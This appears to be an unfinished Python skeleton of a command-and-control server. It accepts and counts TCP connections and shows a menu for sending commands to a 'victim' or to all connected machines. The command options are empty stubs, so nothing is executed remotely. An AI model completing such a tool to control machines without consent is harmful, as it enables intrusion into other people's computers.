import socket
import threading

HOST=socket.gethostbyname(socket.gethostname())
PORT=12345
FORMAT='UTF-8'
list_of_clients=[]
client_counter=0

def connection_accepter():
    global client_counter
    print("server is starting")
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((HOST,PORT))
    server.listen()
    print(f"server is running on ip {HOST}")
    while True:
        conn,addr=server.accept()
        print(f"the new client is {addr}")
        list_of_clients.append((conn,addr))
        client_counter+=1
        print(f"the number of active connection is {client_counter}")


def showing_menu():
    print("1.show the number of connectiones")
    print("2.send a command to a victim")
    print("3.send all users a command")


def program_handler():
    print("welcome to the menu")
    end_of_program=False
    while not end_of_program:
        showing_menu()
        choice=int(input())
        if(choice==1):
            pass
        if(choice==2):
            pass
        if(choice==3):
            pass


def start():
    connection_thread=threading.Thread(target=connection_accepter)
    connection_thread.start()
   # handeling_thread=threading.Thread(target=program_handler)
   # handeling_thread.start()

    x=0
    while 1:
        x=x+1
    
    
start()